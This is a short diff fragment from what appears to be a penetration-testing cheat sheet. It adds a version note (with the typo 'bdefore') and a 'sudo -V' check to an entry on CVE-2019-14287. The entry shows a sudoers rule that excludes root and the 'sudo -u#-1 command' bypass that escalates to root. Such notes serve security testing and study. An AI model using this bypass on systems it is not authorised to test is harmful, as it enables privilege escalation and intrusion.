@@ -354,6 +354,8 @@ reverse.exe
 
 ```
 CVE-2019-14287
+bdefore: sudo 1.8.28
+sudo -V
 <user> ALL=(ALL:!root) NOPASSWD: ALL
 sudo -u#-1 command
 
